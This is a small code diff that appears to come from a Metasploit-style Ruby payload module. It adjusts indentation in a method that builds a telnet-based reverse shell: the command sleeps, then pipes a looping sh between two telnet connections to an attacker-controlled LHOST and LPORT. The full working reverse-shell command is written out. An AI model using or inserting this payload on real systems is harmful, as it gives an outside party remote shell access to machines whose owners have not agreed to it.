@@ -45,9 +45,9 @@ module Reverse
 	def command_string
 		cmd =
 			"sleep 7200|" +
-    		"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
-    		"while : ; do sh && break; done 2>&1|" +
-    		"telnet #{datastore['LHOST']} #{datastore['LPORT']}"
+			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
+			"while : ; do sh && break; done 2>&1|" +
+			"telnet #{datastore['LHOST']} #{datastore['LPORT']}"
 		return cmd
 	end
 
